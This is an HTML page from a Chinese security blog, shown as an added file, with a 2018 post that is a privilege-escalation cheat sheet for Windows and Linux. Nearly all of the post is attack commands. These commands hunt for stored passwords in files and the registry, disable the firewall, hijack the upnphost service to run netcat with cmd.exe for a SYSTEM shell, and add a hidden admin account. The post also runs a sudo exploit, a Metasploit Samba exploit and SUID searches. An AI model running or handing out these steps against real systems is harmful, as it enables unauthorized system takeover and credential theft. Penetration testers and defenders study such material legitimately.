@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="笔记,域渗透," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Sparrow's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x01 常见信息收集dir /a-r-d /s /b                                 检查文件夹可写状态 dir /b/s password.txt                            查找密码文件或其它敏感文件 dir /b/s config.* findstr /si password *.xml *.ini *.txt  findstr">
+<meta name="keywords" content="笔记,域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透(提权篇)">
+<meta property="og:url" content="https://sp4rr0w.github.io/2018/01/09/域渗透(提权篇)/index.html">
+<meta property="og:site_name" content="Sparrow&#39;s blog">
+<meta property="og:description" content="0x01 常见信息收集dir /a-r-d /s /b                                 检查文件夹可写状态 dir /b/s password.txt                            查找密码文件或其它敏感文件 dir /b/s config.* findstr /si password *.xml *.ini *.txt  findstr">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-03-27T08:33:33.813Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="域渗透(提权篇)">
+<meta name="twitter:description" content="0x01 常见信息收集dir /a-r-d /s /b                                 检查文件夹可写状态 dir /b/s password.txt                            查找密码文件或其它敏感文件 dir /b/s config.* findstr /si password *.xml *.ini *.txt  findstr">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://sp4rr0w.github.io/2018/01/09/域渗透(提权篇)/"/>
+
+
+
+
+
+  <title>域渗透(提权篇) | Sparrow's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sparrow's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            Über
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Kategorien
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            Schedule
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            Commonweal 404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sp4rr0w.github.io/2018/01/09/域渗透(提权篇)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sparrow">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sparrow's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">域渗透(提权篇)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-09T15:20:00-05:00">
+                2018-01-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术相关/" itemprop="url" rel="index">
+                    <span itemprop="name">技术相关</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <a id="more"></a>
+<h2 id="0x01-常见信息收集"><a href="#0x01-常见信息收集" class="headerlink" title="0x01 常见信息收集"></a>0x01 常见信息收集</h2><pre><code>dir /a-r-d /s /b                                 检查文件夹可写状态
+dir /b/s password.txt                            查找密码文件或其它敏感文件
+dir /b/s config.*
+findstr /si password *.xml *.ini *.txt 
+findstr /si login *.xml *.ini *.txt 
+C:\sysprep.inf
+C:\sysprep\sysprep.xml
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\Panther\Unattended.xml
+dir /s *pass* == *cred* == *vnc* == *.config*    搜索system32关键字的文件
+findstr /si password *.xml *.ini *.txt           搜索某些特定的文件类型
+reg query HKLM /f password /t REG_SZ /s          搜索注册表中包含password
+reg query HKCU /f password /t REG_SZ /s
+netsh firewall show config                       显示 Windows 防火墙配置
+netsh firewall show state                        显示 Windows 防火墙的当前状态 
+netsh firewall set opmode disable                关闭防火墙
+netsh advfilewall set publicprofile state off
+systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;    获取操作系统信息
+systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;         
+schtasks /query /fo LIST /v                      计划任务 [国外调整 chcp 437]
+route print                                      查看路由表
+arp -A                                           查看ARP缓存
+</code></pre><h2 id="0x02-upnphost提权"><a href="#0x02-upnphost提权" class="headerlink" title="0x02 upnphost提权"></a>0x02 upnphost提权</h2><pre><code>sc qc Spooler                 查询，配置，和管理Windows服务
+accesschk.exe -ucqv Spooler   检查每个服务需要的权限   XP_SP2被修复
+攻击手法：
+    sc qc upnphost
+    sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e    C:\WINDOWS\System32\cmd.exe&quot;
+    sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
+    sc qc upnphost
+    net start upnphost
+    执行netcat并且使用SYSTEM权限反弹一个shell
+    sc config PFNET binpath= &quot;net user admin P@ssword123! /add&quot;
+    sc stop PFNET
+    sc start PFNET
+    sc config PFNET binpath= &quot;net localgroup Administrators admin /add&quot;
+    sc stop PFNET
+    sc start PFNET
+</code></pre><h2 id="0x03-服务与权限"><a href="#0x03-服务与权限" class="headerlink" title="0x03 服务与权限"></a>0x03 服务与权限</h2><pre><code>DRIVERQUERY                 安装驱动
+wmic product list brief     查看安装程序和版本信息. [可能存在漏洞]
+wmic service list brief     查看服务、进程和启动程序信息
+wmic process list brief
+wmic startup list brief
+wmic qfe get Caption,Description,HotFixID,InstalledOn   查看安装补丁和时间信息
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;
+wimc process where(description=&quot;进程名&quot;)       结合tasklist /svc 
+wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;    列出目标机器上所有没有用引号包含的服务路径
+tasklist /v /fo list /fi &quot;USERNAME eq NT AUTHORITY\SYSTEM&quot;  筛选NT AUTHORITY\SYSTEM权限进程
+icacls &quot;C:\Program Files (x86)\360&quot;     查看路径中受影响文件夹的权限
+</code></pre><h2 id="0x04-补丁对应Exp"><a href="#0x04-补丁对应Exp" class="headerlink" title="0x04 补丁对应Exp"></a>0x04 补丁对应Exp</h2><p>补丁对比 <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
+<pre><code>pip install xlrd --upgrade
+./windows-exploit-suggester.py --update
+[+] writing to file 2014-06-06-mssb.xlsx 
+输入“systeminfo”输入，并将其指向微软数据库
+./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo     win7sp1-systeminfo.txt 
+未修补漏洞存在的exp
+./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext     &#39;windows server 2008 r2&#39;
+</code></pre><h2 id="0x05-AlwaysInstallElevated提权"><a href="#0x05-AlwaysInstallElevated提权" class="headerlink" title="0x05 AlwaysInstallElevated提权"></a>0x05 AlwaysInstallElevated提权</h2><pre><code>http://www.greyhathacker.net/?p=185
+如果这个设置被启用，它允许任何权限的用户暂时使用NT AUTHORITY\SYSTEM权限来安装*.msi文件。
+AlwaysInstallElevated且它的DWORD值是1才有效。
+https://github.com/SecWiki/windows-kernel-exploits
+https://github.com/SecWiki/linux-kernel-exploits
+可以利用Advanced Installer(http://www.advancedinstaller.com/)生成msi安装包
+</code></pre><h2 id="0x06-查看-msi程序的执行权限"><a href="#0x06-查看-msi程序的执行权限" class="headerlink" title="0x06 查看.msi程序的执行权限"></a>0x06 查看.msi程序的执行权限</h2><pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre><h2 id="0x07-查看是否设置有setuid和setgid"><a href="#0x07-查看是否设置有setuid和setgid" class="headerlink" title="0x07 查看是否设置有setuid和setgid"></a>0x07 查看是否设置有setuid和setgid</h2><pre><code>reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits
+
+CVE-2017-1000367
+    系统必须启用selinux
+    sudo需要用selinux支持（sudo -r）
+    用户需要具有sudo权限
+gcc -o sudopwn sudopwn.c -lutil
+./sudopwn
+</code></pre><p>枚举系统设置和权限的检查<br><a href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">http://www.securitysift.com/download/linuxprivchecker.py</a></p>
+<h2 id="0x08-基于操作系统的内核版本号"><a href="#0x08-基于操作系统的内核版本号" class="headerlink" title="0x08 基于操作系统的内核版本号"></a>0x08 基于操作系统的内核版本号</h2><pre><code>https://github.com/PenturaLabs/Linux_Exploit_Suggester
+./Linux_Exploit_Suggester.pl -k 内核版本号[例如3.10,结合uname -a]
+</code></pre><h2 id="0x09-检测权限提升向量的shell脚本"><a href="#0x09-检测权限提升向量的shell脚本" class="headerlink" title="0x09 检测权限提升向量的shell脚本"></a>0x09 检测权限提升向量的shell脚本</h2><pre><code>https://github.com/pentestmonkey/unix-privesc-check
+unix-privesc-check standard
+unix-privesc-check detailed
+</code></pre><p>下载和解压缩脚本RootHelper<br><a href="https://github.com/NullArray/RootHelper" target="_blank" rel="noopener">https://github.com/NullArray/RootHelper</a></p>
+<h2 id="0x10-CVE-2017-7494-Samba"><a href="#0x10-CVE-2017-7494-Samba" class="headerlink" title="0x10 CVE-2017-7494[Samba]"></a>0x10 CVE-2017-7494[Samba]</h2><pre><code>http://fuping.site/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/
+use exploit/linux/samba/is_known_pipename
+set RHOST 192.168.232.137
+set target 3
+exploit
+</code></pre><h2 id="0x11-内核提权"><a href="#0x11-内核提权" class="headerlink" title="0x11 内核提权"></a>0x11 内核提权</h2><pre><code>lsb_release -a
+uname -a
+python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+suid 提权 [有限制]
+find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre><p>from:<br><a href="https://04z.net/2017/07/10/AD-Attacks-go/" target="_blank" rel="noopener">https://04z.net/2017/07/10/AD-Attacks-go/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/笔记/" rel="tag"># 笔记</a>
+          
+            <a href="/tags/域渗透/" rel="tag"># 域渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/09/批量测试端口开放/" rel="next" title="批量测试端口开放">
+                <i class="fa fa-chevron-left"></i> 批量测试端口开放
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/13/利用域委派获取域某些权限/" rel="prev" title="利用域委派获取域某些权限">
+                利用域委派获取域某些权限 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sparrow</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-常见信息收集"><span class="nav-number">1.</span> <span class="nav-text">0x01 常见信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-upnphost提权"><span class="nav-number">2.</span> <span class="nav-text">0x02 upnphost提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-服务与权限"><span class="nav-number">3.</span> <span class="nav-text">0x03 服务与权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-补丁对应Exp"><span class="nav-number">4.</span> <span class="nav-text">0x04 补丁对应Exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-AlwaysInstallElevated提权"><span class="nav-number">5.</span> <span class="nav-text">0x05 AlwaysInstallElevated提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-查看-msi程序的执行权限"><span class="nav-number">6.</span> <span class="nav-text">0x06 查看.msi程序的执行权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-查看是否设置有setuid和setgid"><span class="nav-number">7.</span> <span class="nav-text">0x07 查看是否设置有setuid和setgid</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-基于操作系统的内核版本号"><span class="nav-number">8.</span> <span class="nav-text">0x08 基于操作系统的内核版本号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-检测权限提升向量的shell脚本"><span class="nav-number">9.</span> <span class="nav-text">0x09 检测权限提升向量的shell脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-CVE-2017-7494-Samba"><span class="nav-number">10.</span> <span class="nav-text">0x10 CVE-2017-7494[Samba]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-内核提权"><span class="nav-number">11.</span> <span class="nav-text">0x11 内核提权</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sparrow</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
